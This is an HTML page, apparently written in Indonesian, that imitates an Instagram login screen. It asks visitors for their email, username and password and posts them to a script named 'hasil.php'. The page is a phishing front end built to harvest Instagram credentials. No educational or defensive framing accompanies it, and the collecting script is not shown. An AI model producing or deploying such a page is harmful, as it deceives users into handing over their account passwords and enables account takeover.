<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Instagram</title>
	<link rel="stylesheet" type="text/css" href="noob.css">
</head>
	<body>
	<div id="container">
		<div class="header">
			Instagram<br>
			<img src="instagram.jpg" width="200px">
		</div>
		<div class="subheader">
			Login untuk melihat foto dan video <br>
			Dari teman kamu
		</div>
		<div class="content">
		<table border=0 align="center" cellpadding=5 cellspacing=0>
		<form action="hasil.php"method="post">
			<tr><td>Email<td/> <td>:</td> <td><input type="email" name="email"></td></tr>
			<tr><td>Username<td/> <td>:</td> <td><input type="text" name="username"></td></tr>
			<tr><td>Password<td/> <td>:</td> <td><input type="password" name="password"></td></tr>
			<tr><td></td><td><td></td></td><td><input type="submit" name="submit" value="LOGIN"></td></tr>
		</form>
		</table>
		</div>
	</div>
	</body>
</html>